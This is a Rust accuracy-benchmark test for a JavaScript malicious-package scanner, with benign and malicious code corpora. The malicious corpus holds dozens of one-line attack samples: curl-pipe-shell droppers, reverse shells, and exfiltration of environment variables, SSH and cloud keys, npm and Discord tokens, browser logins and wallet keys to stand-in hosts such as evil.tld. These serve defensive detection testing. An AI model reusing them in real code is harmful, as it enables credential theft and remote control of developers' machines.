//! Accuracy benchmark: measures recall on a malicious corpus and the
//! false-positive rate on a benign corpus of realistic popular-package code.
//!
//! Run with output:  cargo test --release --test accuracy -- --nocapture
//!
//! The guiding principle: bare "dangerous" APIs (child_process, fs, atob) are
//! common in legitimate tooling and must NOT trigger a BLOCK on their own.
//! A BLOCK requires malicious *context* — network+secrets, shell downloaders,
//! obfuscation wrappers, reverse shells, credential theft, etc.

use std::path::Path;
use vigil::report::{self};
use vigil::rules::RuleSet;
use vigil::scanner::{self, ScanOptions};

fn verdict_of(code: &str) -> (String, u32, usize) {
    let ruleset = RuleSet::default_rules();
    let compiled = ruleset.compile();
    let opts = ScanOptions::default();
    let findings = scanner::scan_source(code, Path::new("sample.js"), &ruleset, &compiled, &opts);
    let score = report::compute_score(&findings);
    (score.verdict().to_string(), score.score, findings.len())
}

fn is_flagged(verdict: &str) -> bool {
    verdict == "BLOCK" || verdict == "INVESTIGATE"
}

// ---------------------------------------------------------------------------
// Malicious corpus — each MUST be flagged (BLOCK/INVESTIGATE).
// ---------------------------------------------------------------------------
fn malicious_corpus() -> Vec<(&'static str, &'static str)> {
    vec![
        ("eval(atob)", r#"const p = eval(atob("Y29uc29sZS5sb2coMSk="));"#),
        // Function-constructor malware decodes its body; a bare
        // new Function("...literal...") is intentionally only REVIEW-tier because
        // template engines / ORMs / validators build functions from strings too.
        ("Function(decoded body)", r#"const f = new Function(atob("cmV0dXJuIHByb2Nlc3MuZW52"))(); require('https').get("http://evil.tld/?d="+f);"#),
        (
            "exec curl|sh",
            r#"require('child_process').exec("curl http://1.2.3.4/x.sh | sh");"#,
        ),
        (
            "execSync wget chmod",
            r#"const {execSync}=require('child_process');execSync("wget http://evil.tld/m && chmod +x m && ./m");"#,
        ),
        (
            "env exfil via fetch",
            r#"fetch("http://evil.tld/c", {method:"POST", body: JSON.stringify(process.env)});"#,
        ),
        (
            "reverse shell net+spawn",
            r#"const net=require('net'),cp=require('child_process');const s=net.connect(4444,"10.0.0.1",()=>{const sh=cp.spawn("/bin/sh",[]);s.pipe(sh.stdin);sh.stdout.pipe(s);});"#,
        ),
        (
            "/dev/tcp reverse shell",
            r#"require('child_process').exec("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");"#,
        ),
        (
            "obfuscator.io array+eval",
            r#"var _0x1a2b=['log','test'];var _0x3c=function(_0x4d){return _0x1a2b[_0x4d]};eval(_0x3c(0));"#,
        ),
        (
            "discord token grab",
            r#"const fs=require('fs');const t=fs.readFileSync(process.env.APPDATA+"/discord/Local Storage/leveldb/000.log");fetch("https://discord.com/api/webhooks/123/abc",{method:"POST",body:t});"#,
        ),
        (
            "ssh key exfil",
            r#"const k=require('fs').readFileSync(require('os').homedir()+"/.ssh/id_rsa");require('https').request("http://evil.tld/k").end(k);"#,
        ),
        (
            "npmrc exfil",
            r#"const t=require('fs').readFileSync(process.env.HOME+"/.npmrc","utf8");fetch("http://evil.tld",{method:"POST",body:t});"#,
        ),
        (
            "aws creds exfil",
            r#"const c=require('fs').readFileSync(process.env.HOME+"/.aws/credentials");require('axios').post("http://evil.tld/a",c);"#,
        ),
        (
            "dns exfil",
            r#"const dns=require('dns');dns.resolve(process.env.SECRET_TOKEN + ".evil.tld", ()=>{});"#,
        ),
        (
            "process.binding spawn",
            r#"const sp=process.binding('spawn_sync');"#,
        ),
        (
            "mainModule require",
            r#"const cp=process.mainModule.require('child_process');cp.exec('id');"#,
        ),
        (
            "createDecipheriv payload",
            r#"const c=require('crypto').createDecipheriv('aes-256-cbc',k,iv);const code=c.update(buf)+c.final();eval(code);"#,
        ),
        (
            "hex require",
            r#"const m=require(Buffer.from("6368696c645f70726f63657373","hex").toString());m.exec("id");"#,
        ),
        (
            "wasm from base64",
            r#"WebAssembly.instantiate(Buffer.from("AGFzbQ==","base64")).then(m=>m.instance.exports.run());"#,
        ),
        (
            "globalThis eval",
            r#"globalThis["eval"](atob("YWxlcnQoMSk="));"#,
        ),
        (
            "Buffer hex eval",
            r#"eval(Buffer.from("636f6e736f6c652e6c6f672831293b","hex").toString());"#,
        ),
        (
            "exfil to webhook.site",
            r#"const o=require('os');require('https').get("https://webhook.site/abc?h="+o.hostname()+"&u="+o.userInfo().username);"#,
        ),
        (
            "exfil to oast/interactsh",
            r#"require('dns').lookup(process.env.AWS_SECRET_ACCESS_KEY+".oast.fun", ()=>{});"#,
        ),
        (
            "hardcoded ip:port connect",
            r#"const net=require('net');const c=net.createConnection(1337,"45.61.139.22");c.write(JSON.stringify(process.env));"#,
        ),
        (
            "npm token exfil",
            r#"fetch("http://evil.tld",{method:"POST",body:process.env.NPM_TOKEN});"#,
        ),
        (
            "github token exfil",
            r#"require('axios').post("http://collect.evil.tld", {t: process.env.GITHUB_TOKEN});"#,
        ),
        (
            "browser login data theft",
            r#"const p=require('os').homedir()+"/AppData/Local/Google/Chrome/User Data/Default/Login Data";const d=require('fs').readFileSync(p);require('https').request("http://evil.tld").end(d);"#,
        ),
        (
            "setTimeout delayed dropper",
            r#"setTimeout(()=>{require('child_process').exec("curl http://evil.tld/p -o /tmp/p && sh /tmp/p")}, 600000);"#,
        ),
        (
            "atob new Function",
            r#"new Function(atob("cmV0dXJuIDQy"))();"#,
        ),
        // NOTE: a *standalone* prototype-pollution write (o["__proto__"][k]=v) is
        // intentionally only High/REVIEW, not BLOCK — legit deep-merge and HTML
        // sanitizer libraries contain the identical construct in their defenses.
        // We flag it as a signal; a BLOCK requires corroborating malicious context.
        (
            "vm sandbox escape",
            r#"const vm=require('vm');vm.runInNewContext("this.constructor.constructor('return process')().mainModule.require('child_process').exec('id')");"#,
        ),
        // --- evasion variants ---
        (
            "string-concat require",
            r#"const m=require("ch"+"ild_pro"+"cess");m.exec("curl http://evil.tld/x.sh | sh");"#,
        ),
        (
            "env enumeration exfil",
            r#"const d=Object.keys(process.env).map(k=>k+"="+process.env[k]).join("&");require('axios').post("http://evil.tld/c",d);"#,
        ),
        (
            "powershell encoded",
            r#"require('child_process').exec("powershell -enc SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0AC...)");"#,
        ),
        (
            "jsfuck constructor",
            r#"[]["constructor"]["constructor"]("return process")().mainModule.require("child_process").exec("id");"#,
        ),
        (
            "fromCharCode eval",
            r#"eval(String.fromCharCode(97,108,101,114,116,40,49,41));"#,
        ),
        (
            "atob fetch chain",
            r#"fetch(atob("aHR0cDovL2V2aWwudGxkL2M="),{method:"POST",body:process.env.AWS_SECRET_ACCESS_KEY});"#,
        ),
        // Aliased http-module require defeats literal-call sink rules: the request
        // is issued through a local alias, not `https.request(`. SC-040 correlates
        // the require site with the nearby env dump instead.
        (
            "aliased require env exfil",
            r#"const h=require('https');const d=JSON.stringify(process.env);h.request("https://evil.tld/c",()=>{}).end(d);"#,
        ),
        // undici is a first-class HTTP client with no `http`/`https` in the call
        // site — broadened SC-003 sinks catch it.
        (
            "undici env exfil",
            r#"const {request}=require('undici');request("https://evil.tld/u",{method:"POST",body:JSON.stringify(process.env)});"#,
        ),
        // --- key theft & anti-analysis (SC-041..SC-049, EV-001) ---
        // SC-041 is Critical on its own: cloud metadata = IAM credential theft.
        (
            "cloud metadata steal",
            r#"require('https').get("http://169.254.169.254/latest/meta-data/iam/security-credentials/",r=>{let d="";r.on("data",c=>d+=c);r.on("end",()=>fetch("http://evil.tld/?c="+encodeURIComponent(d)))});"#,
        ),
        // SC-042 (High) needs corroborating context to BLOCK — a loader hook that
        // phones home is exactly how the real ones look.
        (
            "module loader hook exfil",
            r#"const Module=require('module');const orig=Module.prototype.require;Module.prototype.require=function(id){if(id==='fs'){fetch("http://evil.tld/x?e="+JSON.stringify(process.env))}return orig.apply(this,arguments)};"#,
        ),
        (
            "data uri code import",
            r#"import("data:text/javascript;base64,Y29uc29sZS5sb2coMSk=").then(m=>m.run());"#,
        ),
        (
            "worker eval env exfil",
            r#"const {Worker}=require('worker_threads');new Worker("fetch('http://evil.tld/?d='+JSON.stringify(process.env))",{eval:true});"#,
        ),
        (
            "git hook persistence",
            r##"require('fs').writeFileSync(".git/hooks/post-checkout","#!/bin/sh\ncurl http://45.61.139.22/x.sh | sh");require('child_process').execSync("chmod +x .git/hooks/post-checkout");"##,
        ),
        (
            "pastebin dead-drop c2",
            r#"const os=require('os');fetch("https://pastebin.com/raw/xYz9Ab12?h="+os.hostname()+"&e="+encodeURIComponent(JSON.stringify(process.env)));"#,
        ),
        (
            "wallet keypair exfil",
            r#"const kp=Keypair.fromSecretKey(bs58.decode(s));tx.sign(kp);fetch("https://evil.tld/k",{method:"POST",body:JSON.stringify({PRIVATE_KEY:bs58.encode(kp.secretKey)})});"#,
        ),
        (
            "seed phrase harvest exfil",
            r#"const w=hdkey.fromMasterSeed(bip39.mnemonicToSeedSync(process.env.MNEMONIC_SECRET));fetch("https://evil.tld/w",{method:"POST",body:JSON.stringify(w.privateKey.toString("hex"))});"#,
        ),
        // EV-001 alone is Medium by design; real anti-debug wrappers guard a
        // decode-and-execute payload, which is what flips the verdict.
        (
            "debugger anti-debug trap",
            r#"setInterval(()=>{debugger;},50);eval(atob("Y29uc29sZS5sb2coMSk="));"#,
        ),
    ]
}

// ---------------------------------------------------------------------------
// Benign corpus — realistic popular-package code. MUST NOT be flagged.
// ---------------------------------------------------------------------------
fn benign_corpus() -> Vec<(&'static str, &'static str)> {
    vec![
        (
            "express route",
            r#"const express=require('express');const app=express();app.get('/users/:id',(req,res)=>{res.json({id:req.params.id})});app.listen(3000);"#,
        ),
        (
            "lodash debounce",
            r#"function debounce(fn,wait){let t;return function(...a){clearTimeout(t);t=setTimeout(()=>fn.apply(this,a),wait)}}module.exports=debounce;"#,
        ),
        (
            "config loader",
            r#"const fs=require('fs');const cfg=JSON.parse(fs.readFileSync('./config.json','utf8'));module.exports=cfg;"#,
        ),
        (
            "axios api call",
            r#"const axios=require('axios');async function getUser(id){const r=await axios.get(`https://api.example.com/users/${id}`);return r.data}"#,
        ),
        (
            "password hashing",
            r#"const crypto=require('crypto');function hash(pw,salt){return crypto.createHash('sha256').update(pw+salt).digest('hex')}"#,
        ),
        (
            "react component",
            r#"import React from 'react';export default function Button({label,onClick}){return <button onClick={onClick}>{label}</button>}"#,
        ),
        (
            "commander cli",
            r#"const {program}=require('commander');program.option('-d, --debug').parse();const opts=program.opts();console.log(opts.debug);"#,
        ),
        (
            "node_env check",
            r#"const isProd=process.env.NODE_ENV==='production';if(isProd){console.log('prod mode')}module.exports={isProd};"#,
        ),
        (
            "build script exec tsc",
            r#"const {execSync}=require('child_process');execSync('tsc -p tsconfig.json',{stdio:'inherit'});console.log('built');"#,
        ),
        (
            "jest spawn test runner",
            r#"const {spawn}=require('child_process');const p=spawn('jest',['--coverage'],{stdio:'inherit'});p.on('close',c=>process.exit(c));"#,
        ),
        (
            "dotenv usage",
            r#"require('dotenv').config();const port=process.env.PORT||3000;module.exports={port};"#,
        ),
        (
            "jsonwebtoken",
            r#"const jwt=require('jsonwebtoken');function sign(u){return jwt.sign({sub:u.id},process.env.JWT_SECRET,{expiresIn:'1h'})}"#,
        ),
        (
            "winston logger",
            r#"const winston=require('winston');const logger=winston.createLogger({transports:[new winston.transports.Console()]});module.exports=logger;"#,
        ),
        (
            "fs write cache",
            r#"const fs=require('fs');function cache(key,data){fs.writeFileSync(`./.cache/${key}.json`,JSON.stringify(data))}module.exports=cache;"#,
        ),
        (
            "base64 image util",
            r#"function toDataURL(buf,mime){return `data:${mime};base64,`+buf.toString('base64')}module.exports={toDataURL};"#,
        ),
        (
            "atob browser polyfill",
            r#"export function decode(s){return typeof atob==='function'?atob(s):Buffer.from(s,'base64').toString('binary')}"#,
        ),
        (
            "os cpu count",
            r#"const os=require('os');const workers=os.cpus().length;console.log(`spawning ${workers} workers`);module.exports={workers};"#,
        ),
        (
            "http server",
            r#"const http=require('http');http.createServer((req,res)=>{res.writeHead(200);res.end('ok')}).listen(8080);"#,
        ),
        (
            "net echo server",
            r#"const net=require('net');net.createServer(sock=>{sock.on('data',d=>sock.write(d))}).listen(7);"#,
        ),
        (
            "template engine",
            r#"function render(tpl,data){return tpl.replace(/\{\{(\w+)\}\}/g,(_,k)=>data[k]??'')}module.exports=render;"#,
        ),
        (
            "mongoose model",
            r#"const mongoose=require('mongoose');const User=mongoose.model('User',new mongoose.Schema({name:String,email:String}));module.exports=User;"#,
        ),
        (
            "prototype check guard",
            r#"function has(o,k){return Object.prototype.hasOwnProperty.call(o,k)}module.exports=has;"#,
        ),
        (
            "readFile env config",
            r#"const fs=require('fs');const path=require('path');const p=path.join(__dirname,'.env.defaults');const raw=fs.existsSync(p)?fs.readFileSync(p,'utf8'):'';module.exports=raw;"#,
        ),
        (
            "webpack require",
            r#"const path=require('path');module.exports={entry:'./src/index.js',output:{path:path.resolve(__dirname,'dist'),filename:'bundle.js'}};"#,
        ),
        (
            "graphql resolver",
            r#"const resolvers={Query:{user:async(_,{id},{db})=>db.users.findById(id),posts:async()=>[]}};module.exports=resolvers;"#,
        ),
        // --- adversarial: looks scary, is legit ---
        (
            "redis localhost client",
            r#"const net=require('net');const c=net.createConnection(6379,'127.0.0.1');c.write('PING\r\n');c.on('data',d=>console.log(d.toString()));"#,
        ),
        (
            "jwt base64 decode",
            r#"function decodeJwt(t){const[,p]=t.split('.');return JSON.parse(Buffer.from(p,'base64').toString('utf8'))}module.exports=decodeJwt;"#,
        ),
        (
            "data uri atob parse",
            r#"export function parseDataUri(uri){const[meta,data]=uri.split(',');const bytes=atob(data);return{mime:meta.split(';')[0].slice(5),bytes}}"#,
        ),
        (
            "git version via execSync",
            r#"const {execSync}=require('child_process');function gitVersion(){try{return execSync('git rev-parse HEAD').toString().trim()}catch{return 'unknown'}}"#,
        ),
        (
            "constructor.name check",
            r#"function typeName(v){return v===null?'null':v.constructor&&v.constructor.name||typeof v}module.exports=typeName;"#,
        ),
        (
            "class prototype method",
            r#"function Animal(n){this.name=n}Animal.prototype.speak=function(){return this.name+' makes a sound'};module.exports=Animal;"#,
        ),
        (
            "crypto randomBytes token",
            r#"const crypto=require('crypto');function makeToken(){return crypto.randomBytes(32).toString('hex')}module.exports=makeToken;"#,
        ),
        (
            "env config logging",
            r#"const cfg={port:process.env.PORT||3000,db:process.env.DATABASE_URL,env:process.env.NODE_ENV};console.log('config loaded',Object.keys(cfg));module.exports=cfg;"#,
        ),
        // FP guard for SC-040: requiring the https module and reading a benign env
        // var (PORT) is the single most common server idiom. Without a *strong*
        // secret signal in the window, the require must NOT be flagged.
        (
            "https server reads PORT",
            r#"const https=require('https');const app=require('./app');https.createServer(app).listen(process.env.PORT||443,()=>console.log('up'));"#,
        ),
        // FP guard for SC-048/049: legit web3 signing with no exfil sink nearby
        // must stay clean — bare Keypair.fromSecretKey/signTransaction is every
        // wallet library.
        (
            "solana sign no exfil",
            r#"const {Keypair,Transaction}=require('@solana/web3.js');const payer=Keypair.fromSecretKey(Uint8Array.from([7,7,7]));const tx=new Transaction();tx.sign(payer);module.exports={tx};"#,
        ),
        // FP guard for SC-044/045: worker_threads with a file (not eval:true) is
        // how jest-worker/piscina/terser run — at most a LOW signal, never flagged.
        (
            "worker_threads file worker",
            r#"const {Worker}=require('worker_threads');const w=new Worker(require.resolve('./heavy-worker.js'));w.once('message',r=>console.log(r));"#,
        ),
        // FP guard for SC-046: husky-style hook installation is deliberate and
        // harmless — Medium at most, never BLOCK/INVESTIGATE.
        (
            "husky git hook writer",
            r#"const fs=require('fs');fs.writeFileSync('.git/hooks/pre-commit','#!/bin/sh\nnpm test\n');fs.chmodSync('.git/hooks/pre-commit',0o755);"#,
        ),
    ]
}

#[test]
fn accuracy_benchmark() {
    let malicious = malicious_corpus();
    let benign = benign_corpus();

    let mut caught = 0;
    let mut missed: Vec<&str> = Vec::new();
    for (name, code) in &malicious {
        let (verdict, score, n) = verdict_of(code);
        if is_flagged(&verdict) {
            caught += 1;
        } else {
            missed.push(name);
        }
        if std::env::var("VIGIL_BENCH_VERBOSE").is_ok() {
            println!("  MAL  {:<28} {:>11} score={:<3} findings={}", name, verdict, score, n);
        }
    }

    let mut clean = 0;
    let mut false_positives: Vec<(&str, String, u32)> = Vec::new();
    for (name, code) in &benign {
        let (verdict, score, _n) = verdict_of(code);
        if is_flagged(&verdict) {
            false_positives.push((name, verdict, score));
        } else {
            clean += 1;
        }
    }

    let recall = caught as f64 / malicious.len() as f64;
    let specificity = clean as f64 / benign.len() as f64;

    println!("\n========== VIGIL ACCURACY BENCHMARK ==========");
    println!(
        "Malicious caught : {}/{}  (recall {:.1}%)",
        caught,
        malicious.len(),
        recall * 100.0
    );
    println!(
        "Benign clean     : {}/{}  (specificity {:.1}%)",
        clean,
        benign.len(),
        specificity * 100.0
    );
    if !missed.is_empty() {
        println!("\nMISSED malicious ({}):", missed.len());
        for m in &missed {
            println!("  ✗ {m}");
        }
    }
    if !false_positives.is_empty() {
        println!("\nFALSE POSITIVES ({}):", false_positives.len());
        for (n, v, s) in &false_positives {
            println!("  ✗ {n} → {v} (score {s})");
        }
    }
    println!("==============================================\n");

    // Demo-grade thresholds.
    assert!(
        missed.is_empty(),
        "{} malicious sample(s) not flagged: {:?}",
        missed.len(),
        missed
    );
    assert!(
        false_positives.is_empty(),
        "{} benign sample(s) wrongly flagged: {:?}",
        false_positives.len(),
        false_positives
    );
}
